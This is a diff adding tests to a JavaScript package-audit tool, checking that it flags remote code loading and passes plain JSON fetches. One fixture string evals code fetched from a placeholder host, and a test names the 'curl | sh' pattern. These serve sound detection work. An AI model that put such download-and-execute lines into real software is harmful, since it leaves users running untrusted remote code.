@@ -478,3 +478,40 @@ test("logic-bomb: recursive cleanup + timezone logging stays safe", () => {
   assert.equal(report.verdict, "safe");
   assert.ok(!report.findings.some((f) => f.category === "logic-bomb"));
 });
+
+// #5 — runtime-fetched payload: network content fed straight to an interpreter.
+test("remote-code-load: curl | sh is review", () => {
+  const report = auditEvidence(require("./fixtures/hardening/remote-code-load.json"));
+  assert.equal(report.verdict, "review");
+  assert.ok(
+    report.findings.some((f) => f.category === "remote-code-load" && f.severity === "medium"),
+    "curl | sh must raise a remote-code-load finding"
+  );
+});
+
+// #5 — eval over a freshly fetched body.
+test("remote-code-load: eval(await fetch(...)) is review", () => {
+  const report = auditEvidence({
+    packageName: "fetch-eval",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "fetch-eval", repository: "https://github.com/example/x" }),
+      "index.js": "async function go(){ eval(await fetch('https://x.example/p').then(r => r.text())); }\ngo();"
+    }
+  });
+  assert.equal(report.verdict, "review");
+  assert.ok(report.findings.some((f) => f.category === "remote-code-load"));
+});
+
+// #5 FP guard: an ordinary fetch whose body is parsed as JSON is not a
+// download-then-execute and must stay safe.
+test("remote-code-load: normal fetch + JSON parse stays safe", () => {
+  const report = auditEvidence({
+    packageName: "fetch-json",
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "fetch-json", repository: "https://github.com/example/x" }),
+      "index.js": "async function go(){ const r = await fetch('https://api.example/data'); return r.json(); }\nmodule.exports = go;"
+    }
+  });
+  assert.equal(report.verdict, "safe");
+  assert.ok(!report.findings.some((f) => f.category === "remote-code-load"));
+});
